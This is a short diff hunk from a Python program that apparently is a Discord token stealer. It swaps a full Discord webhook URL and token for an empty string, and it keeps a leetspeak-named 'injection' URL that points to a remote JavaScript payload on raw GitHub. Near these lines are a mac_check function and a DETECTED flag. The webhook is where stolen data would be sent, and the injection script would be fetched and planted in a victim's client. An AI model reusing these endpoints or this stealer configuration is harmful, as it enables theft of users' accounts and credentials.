@@ -206,7 +206,7 @@ def mac_check():
             pass
 
 
-hook = "https://discord.com/api/webhooks/1216176771829993603/T8WwMb6ZljWBwEAOdFwwloE3alOFORGlCub8OwmoevZDMSP4Mi8Pzl9Zf7auYMvnIFCL"
+hook = ""
 inj3c710n_url = "https://raw.githubusercontent.com/lol1234501/asdadadsd1231/main/injection.js"
 color =  0x812118
 DETECTED = False
